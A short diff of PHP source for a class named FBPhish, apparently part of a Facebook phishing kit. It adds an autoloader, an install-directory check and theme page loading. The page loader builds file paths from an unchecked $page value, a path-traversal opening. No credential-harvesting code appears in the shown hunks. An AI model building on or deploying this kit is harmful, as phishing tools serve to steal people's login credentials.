@@ -21,20 +21,40 @@ along with this program.  If not, see http://www.gnu.org/licenses/.
 
 require_once(__DIR__ . "/../config.inc.php");
 
-class FBPhish{
+spl_autoload_register(function ($class) {
+    require_once(__DIR__ . '/' . $class . '.class.php');
+});
+
+class FBPhish extends sql{
+	public $version = "1.7";
+
 	private $content;
 	private $page;
 	private $themecheck_results;
 	private $themecheck_results_i;
 	private $themecheck_results_im;
 	private $apppath;
+	public $debug;
 
 	public function __construct() {
-
+		$this->installcheck();
 	}
 
 	public function init() {
 		$this->__construct();
+	}
+
+	public function installcheck(){
+		global $apppath;
+		global $debug;
+
+		if(is_dir("$apppath/install")){
+			echo "<h1>Please delete install dir after installation</h1>";
+			echo "<h3>The /install dir should be deleted</h3>";
+			if($debug != "true"){
+				die();
+			}
+		}
 	}
 
 	public function themecheck() {
@@ -84,7 +104,12 @@ class FBPhish{
 
 		$apppath = __DIR__;
 
-		$this->content = file_get_contents("$apppath/../themes/$theme/home.php");
+		if($page != "home"){
+			$this->content = file_get_contents("$apppath/../themes/$theme/pages/$page.php");
+		}else{
+			$this->content = file_get_contents("$apppath/../themes/$theme/home.php");
+		}
+
 		return $this->content;
 	}
 }
